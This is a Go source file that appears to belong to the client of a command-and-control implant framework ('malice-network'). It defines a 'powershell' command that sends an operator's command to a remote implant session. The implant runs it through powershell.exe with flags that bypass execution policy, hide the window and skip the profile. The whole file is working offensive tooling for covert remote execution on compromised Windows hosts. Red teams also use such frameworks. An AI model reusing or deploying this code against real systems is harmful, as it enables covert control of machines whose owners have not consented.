package exec

import (
	"github.com/chainreactors/malice-network/client/core"
	"github.com/chainreactors/malice-network/client/repl"
	"github.com/chainreactors/malice-network/proto/client/clientpb"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/proto/services/clientrpc"
	"github.com/kballard/go-shellquote"
	"github.com/spf13/cobra"
)

func PowershellCmd(cmd *cobra.Command, con *repl.Console) {
	session := con.GetInteractive()
	//token := ctx.Flags.Bool("token")
	quiet, _ := cmd.Flags().GetBool("quiet")
	cmdStr := shellquote.Join(cmd.Flags().Args()...)
	task, err := Powershell(con.Rpc, session, cmdStr, !quiet)
	if err != nil {
		con.Log.Errorf("Execute error: %v", err)
		return
	}
	con.GetInteractive().Console(task, "powershell: "+cmdStr)
}

func Powershell(rpc clientrpc.MaliceRPCClient, sess *core.Session, cmd string, output bool) (*clientpb.Task, error) {
	task, err := rpc.Execute(sess.Context(), &implantpb.ExecRequest{
		Path:   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		Args:   []string{"-ExecutionPolicy", "Bypass", "-w", "hidden", "-nop", cmd},
		Output: output,
	})
	if err != nil {
		return nil, err
	}
	return task, nil
}
